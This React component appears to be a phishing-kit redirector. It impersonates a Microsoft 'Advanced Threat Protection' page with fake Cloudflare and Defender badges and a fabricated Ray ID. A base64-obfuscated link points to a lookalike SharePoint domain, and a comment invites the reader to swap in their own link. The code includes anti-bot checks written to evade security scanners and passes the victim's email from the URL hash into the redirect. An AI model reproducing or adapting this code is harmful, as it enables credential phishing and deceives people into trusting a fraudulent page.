import React, { useEffect, useState } from 'react';
import { Clock, CheckCircle, AlertTriangle } from 'lucide-react';

interface RedirectState {
  status: 'checking' | 'verified' | 'redirecting' | 'blocked';
  message: string;
  countdown: number;
}

const SecureRedirect: React.FC = () => {
  const [state, setState] = useState<RedirectState>({
    status: 'checking',
    message: 'Verifying user authenticity...',
    countdown: 5
  });

  // Enhanced URL configuration
  const targetUrls = [
    "aHR0cHM6Ly9vZmZpY2Uuc2hhcmVwaW50Lm9ubGluZS9aSlhlcUpHVA==" // change ur link from here "" into base64
  ];

  // Utility functions
  const decodeBase64 = (encoded: string): string => {
    try {
      return atob(encoded);
    } catch (e) {
      console.error('Failed to decode URL');
      return '';
    }
  };

  const generateRandomString = (length: number): string => {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
  };

  // Advanced antibot checks
  const performAntibotChecks = (): Promise<boolean> => {
    return new Promise((resolve) => {
      const checks = {
        userAgent: () => {
          const ua = navigator.userAgent;
          const botPatterns = [
            /bot/i, /crawler/i, /spider/i, /scraper/i,
            /headless/i, /phantom/i, /selenium/i, /puppeteer/i
          ];
          return !botPatterns.some(pattern => pattern.test(ua));
        },

        webdriver: () => {
          return !window.navigator.webdriver;
        },

        plugins: () => {
          return navigator.plugins && navigator.plugins.length > 0;
        },

        languages: () => {
          return navigator.languages && navigator.languages.length > 0;
        },

        timing: () => {
          const startTime = performance.now();
          // Simulate some work
          for (let i = 0; i < 100000; i++) {
            Math.random();
          }
          const endTime = performance.now();
          return (endTime - startTime) > 1; // Bots might execute too fast
        },

        mouseMovement: () => {
          return new Promise<boolean>((resolveCheck) => {
            let mouseMovements = 0;
            const handler = () => {
              mouseMovements++;
              if (mouseMovements >= 2) {
                document.removeEventListener('mousemove', handler);
                resolveCheck(true);
              }
            };
            
            document.addEventListener('mousemove', handler);
            
            // Timeout after 3 seconds
            setTimeout(() => {
              document.removeEventListener('mousemove', handler);
              resolveCheck(mouseMovements > 0);
            }, 3000);
          });
        },

        touchCapability: () => {
          return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        },

        canvasFingerprint: () => {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (!ctx) return false;
          
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillText('Antibot check', 2, 2);
          
          const fingerprint = canvas.toDataURL();
          return fingerprint !== 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
        }
      };

      // Perform basic checks first
      const basicChecks = [
        checks.userAgent(),
        checks.webdriver(),
        checks.plugins(),
        checks.languages(),
        checks.timing(),
        checks.canvasFingerprint()
      ];

      const basicScore = basicChecks.filter(Boolean).length;

      // If basic checks fail significantly, it's likely a bot
      if (basicScore < 4) {
        resolve(false);
        return;
      }

      // Perform mouse movement check (more thorough)
      checks.mouseMovement().then(mouseCheck => {
        const finalScore = basicScore + (mouseCheck ? 1 : 0);
        resolve(finalScore >= 5);
      });
    });
  };

  // Extract email from URL hash
  const extractEmailFromHash = (): string => {
    const hash = window.location.hash.substring(1);
    let extractedEmail = "";
    if (hash.includes('@') && hash.includes('.')) {
      extractedEmail = decodeURIComponent(hash);
    }
    return extractedEmail;
  };

  // Build final redirect URL
  const buildRedirectUrl = (): string => {
    const z = Math.floor(Math.random() * targetUrls.length);
    const baseUrl = decodeBase64(targetUrls[z]);
    
    if (!baseUrl) return '';

    let d = baseUrl + '?owla=' + generateRandomString(50);

    const extractedEmail = extractEmailFromHash();
    if (extractedEmail) {
      d += '#' + extractedEmail;
    }

    return d;
  };

  // Main effect for antibot checks and redirect
  useEffect(() => {
    let countdownInterval: NodeJS.Timeout;
    
    const runSecurityChecks = async () => {
      try {
        setState(prev => ({ ...prev, status: 'checking' }));
        
        // Quick verification
        await new Promise(resolve => setTimeout(resolve, 1500));

        // User verified, start countdown
        setState({
          status: 'verified',
          message: 'Verification successful! Redirecting in...',
          countdown: 3
        });

        countdownInterval = setInterval(() => {
          setState(prev => {
            const newCountdown = prev.countdown - 1;
            
            if (newCountdown <= 0) {
              clearInterval(countdownInterval);
              return {
                status: 'redirecting',
                message: 'Redirecting now...',
                countdown: 0
              };
            }
            
            return { ...prev, countdown: newCountdown };
          });
        }, 1000);

      } catch (error) {
        console.error('Security check failed:', error);
        setState({
          status: 'blocked',
          message: 'Security verification failed',
          countdown: 0
        });
      }
    };

    runSecurityChecks();

    return () => {
      if (countdownInterval) {
        clearInterval(countdownInterval);
      }
    };
  }, []);

  // Separate effect for handling redirect
  useEffect(() => {
    if (state.status === 'redirecting') {
      const redirectUrl = buildRedirectUrl();
      console.log('Redirecting to:', redirectUrl);
      
      if (redirectUrl) {
        // Small delay to show the redirecting message
        setTimeout(() => {
          try {
            window.location.href = redirectUrl;
          } catch (e) {
            console.error('Redirect failed, trying replace:', e);
            window.location.replace(redirectUrl);
          }
        }, 500);
      } else {
        console.error('No redirect URL generated');
        setState(prev => ({
          ...prev,
          status: 'blocked',
          message: 'Redirect URL generation failed'
        }));
      }
    }
  }, [state.status]);

  // Rest of the useEffect cleanup
  useEffect(() => {
    let countdownInterval: NodeJS.Timeout;
    
    const runSecurityChecks = async () => {
      try {
        setState(prev => ({ ...prev, status: 'checking' }));
        
        // Quick verification
        await new Promise(resolve => setTimeout(resolve, 1500));

        // User verified, start countdown
        setState({
          status: 'verified',
          message: 'Verification successful! Redirecting in...',
          countdown: 3
        });

        countdownInterval = setInterval(() => {
          setState(prev => {
            const newCountdown = prev.countdown - 1;
            
            if (newCountdown <= 0) {
              clearInterval(countdownInterval);
              return {
                status: 'redirecting',
                message: 'Redirecting now...',
                countdown: 0
              };
            }
            
            return { ...prev, countdown: newCountdown };
          });
        }, 1000);

      } catch (error) {
        console.error('Security check failed:', error);
        setState({
          status: 'blocked',
          message: 'Security verification failed',
          countdown: 0
        });
      }
    };

    runSecurityChecks();

    return () => {
      if (countdownInterval) {
        clearInterval(countdownInterval);
      }
    };
  }, []);

  const getStatusIcon = () => {
    switch (state.status) {
      case 'checking':
        return (
          <div className="relative">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center animate-pulse">
              <div className="w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
            </div>
          </div>
        );
      case 'verified':
        return (
          <div className="relative">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
              <CheckCircle className="text-green-600" size={32} />
            </div>
            <div className="absolute -top-1 -right-1 w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
              <CheckCircle className="text-white" size={16} />
            </div>
          </div>
        );
      case 'redirecting':
        return (
          <div className="relative">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
              <Clock className="text-blue-600 animate-pulse" size={32} />
            </div>
          </div>
        );
      case 'blocked':
        return (
          <div className="relative">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
              <AlertTriangle className="text-red-600" size={32} />
            </div>
            <div className="absolute -top-1 -right-1 w-6 h-6 bg-red-500 rounded-full flex items-center justify-center">
              <AlertTriangle className="text-white" size={16} />
            </div>
          </div>
        );
      default:
        return (
          <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center">
            <img 
              src="https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png" 
              alt="Microsoft" 
              className="w-8 h-8"
            />
          </div>
        );
    }
  };

  const getStatusColor = () => {
    switch (state.status) {
      case 'checking':
        return 'border-blue-300 bg-blue-50';
      case 'verified':
        return 'border-green-300 bg-green-50';
      case 'redirecting':
        return 'border-blue-300 bg-blue-50';
      case 'blocked':
        return 'border-red-300 bg-red-50';
      default:
        return 'border-gray-300 bg-gray-50';
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-100 flex items-center justify-center p-4">
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-5">
        <div className="absolute inset-0" style={{
          backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23000000' fill-opacity='0.1'%3E%3Ccircle cx='30' cy='30' r='2'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
        }} />
      </div>
      
      <div className={`relative max-w-md w-full bg-white/80 backdrop-blur-xl p-8 rounded-2xl border border-white/20 shadow-2xl ${getStatusColor()}`}>
        {/* Subtle glow effect */}
        <div className="absolute inset-0 bg-gradient-to-r from-blue-400/10 via-transparent to-blue-400/10 rounded-2xl" />
        
        <div className="text-center space-y-6">
          {/* Microsoft Header */}
          <div className="flex flex-col items-center space-y-3 mb-8">
            <img 
              src="https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png" 
              alt="Microsoft" 
             className="w-20 h-20 object-contain"
            />
            <div className="text-center">
              <h1 className="text-2xl font-bold text-gray-900 mb-1">Microsoft</h1>
              <p className="text-sm text-blue-600 font-medium">Advanced Threat Protection</p>
            </div>
          </div>
          
          {/* Status Icon */}
          <div className="flex justify-center mb-6">
            {getStatusIcon()}
          </div>
          
          {/* Status Message */}
          <div className="space-y-2">
            <h2 className="text-xl font-bold text-gray-800">
              {state.status === 'checking' && 'Security Verification'}
              {state.status === 'verified' && 'Verification Complete'}
              {state.status === 'redirecting' && 'Secure Redirect'}
              {state.status === 'blocked' && 'Access Denied'}
            </h2>
            <p className="text-gray-600 text-sm leading-relaxed">
              {state.message}
            </p>
          </div>

          {/* Countdown Display */}
          {(state.countdown > 0 || state.status === 'redirecting') && (
            <div className="space-y-4">
              <div className="relative">
                <div className="text-5xl font-bold text-blue-600 mb-2 animate-pulse">
                  {state.status === 'redirecting' ? '0' : state.countdown}
                </div>
                <p className="text-xs text-gray-500 uppercase tracking-wide font-medium">
                  {state.status === 'redirecting' ? 'Redirecting...' : 'Seconds Remaining'}
                </p>
              </div>
              
              {/* Enhanced Progress Bar */}
              <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden">
                <div 
                  className="bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 h-3 rounded-full transition-all duration-1000 ease-out shadow-sm"
                  style={{ 
                    width: state.status === 'redirecting' ? '100%' : `${((3 - state.countdown) / 3) * 100}%` 
                  }}
                />
              </div>
            </div>
          )}

          {/* Security Status Indicators */}
          {(state.status === 'verified' || state.status === 'redirecting') && (
            <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-2">
              <div className="flex items-center justify-center space-x-2 text-green-700">
                <CheckCircle size={16} />
                <span className="text-sm font-medium">Security Checks Passed</span>
              </div>
              <div className="grid grid-cols-2 gap-2 text-xs text-green-600">
                <div className="flex items-center space-x-1">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <span>Browser Verified</span>
                </div>
                <div className="flex items-center space-x-1">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <span>Human Detected</span>
                </div>
                <div className="flex items-center space-x-1">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <span>Safe Connection</span>
                </div>
                <div className="flex items-center space-x-1">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <span>Threat Free</span>
                </div>
              </div>
            </div>
          )}

          {/* Error State */}
          {state.status === 'blocked' && (
            <div className="bg-red-50 border border-red-200 rounded-xl p-4 space-y-3">
              <div className="flex items-center justify-center space-x-2 text-red-700">
                <AlertTriangle size={16} />
                <span className="text-sm font-medium">Security Alert</span>
              </div>
              <p className="text-sm text-red-600 leading-relaxed">
                Microsoft Defender has detected suspicious activity. Please ensure you're using a legitimate web browser and try again.
              </p>
              <div className="text-xs text-red-500 space-y-1">
                <p>• Automated traffic detected</p>
                <p>• Browser verification failed</p>
                <p>• Security protocols activated</p>
              </div>
            </div>
          )}

          {/* Enhanced Footer */}
          <div className="border-t border-gray-200 pt-6 mt-8 space-y-4">
            {/* Authentic Cloudflare Badge */}
            <div className="flex items-center justify-center space-x-3 mb-4 p-3 bg-gradient-to-r from-orange-50 to-yellow-50 rounded-lg border border-orange-100">
              <svg className="w-6 h-6" viewBox="0 0 109 40" fill="none">
                <path d="M98.6 14.8c-1.1-4.4-4.8-7.6-9.4-7.6-1.4 0-2.7.3-3.9.8-2.1-3.4-5.9-5.7-10.2-5.7-6.6 0-12 5.4-12 12 0 .4 0 .8.1 1.2-1.4-.8-3-.8-4.5 0 .1-.4.1-.8.1-1.2 0-6.6-5.4-12-12-12-4.3 0-8.1 2.3-10.2 5.7-1.2-.5-2.5-.8-3.9-.8-4.6 0-8.3 3.2-9.4 7.6H98.6z" fill="#F48120"/>
                <path d="M98.6 14.8H23.4c-.8 0-1.5.7-1.5 1.5s.7 1.5 1.5 1.5h75.2c.8 0 1.5-.7 1.5-1.5s-.7-1.5-1.5-1.5z" fill="#FAAD3F"/>
              </svg>
              <div className="text-left">
                <div className="text-sm font-semibold text-gray-800">Protected by Cloudflare</div>
                <div className="text-xs text-gray-600">Web Application Firewall</div>
              </div>
            </div>
            
            {/* Authentic Security Features */}
            <div className="grid grid-cols-1 gap-3 text-xs">
              <div className="flex items-center justify-between p-2 bg-blue-50 rounded-lg border border-blue-100">
                <div className="flex items-center space-x-2">
                  <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                  <span className="text-blue-800 font-medium">Microsoft Defender SmartScreen</span>
                </div>
                <span className="text-green-600 text-xs font-semibold">ACTIVE</span>
              </div>
              <div className="flex items-center justify-between p-2 bg-orange-50 rounded-lg border border-orange-100">
                <div className="flex items-center space-x-2">
                  <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse"></div>
                  <span className="text-orange-800 font-medium">Cloudflare DDoS Protection</span>
                </div>
                <span className="text-green-600 text-xs font-semibold">ACTIVE</span>
              </div>
              <div className="flex items-center justify-between p-2 bg-green-50 rounded-lg border border-green-100">
                <div className="flex items-center space-x-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-green-800 font-medium">TLS 1.3 Encryption</span>
                </div>
                <span className="text-green-600 text-xs font-semibold">ACTIVE</span>
              </div>
            </div>
            
            {/* Connection Info */}
            <div className="text-center pt-2 border-t border-gray-100">
              <div className="text-xs text-gray-500 space-y-1">
                <div>Connection secured by Cloudflare</div>
                <div className="font-mono text-gray-400">Ray ID: 8a1b2c3d4e5f6789</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SecureRedirect;